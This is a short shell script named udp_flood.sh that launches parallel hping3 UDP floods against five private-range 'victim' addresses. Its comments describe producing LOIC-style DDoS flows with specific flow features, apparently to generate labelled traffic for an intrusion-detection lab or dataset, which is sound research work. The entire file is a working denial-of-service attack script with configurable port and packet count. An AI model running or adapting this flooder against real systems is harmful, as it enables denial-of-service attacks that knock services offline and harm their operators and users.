#!/bin/sh
# udp_flood.sh - UDP flood against all victim nodes.
# Generates DDoS-LOIC-UDP-style flows: high fwd_pkts_per_sec, low flow_iat_mean.
# -k keeps source port fixed so packets per target group into one flow.
# All 5 nodes targeted in parallel.
PORT=${1:-9999}
COUNT=${2:-10000}

VICTIMS="172.20.0.10 172.20.0.11 172.20.0.12 172.20.0.13 172.20.0.14"

echo "[attack] UDP flood -> all nodes  port $PORT  ($COUNT packets each)"
for ip in $VICTIMS; do
    hping3 --udp -k -p "$PORT" -c "$COUNT" --faster "$ip" &
done
wait
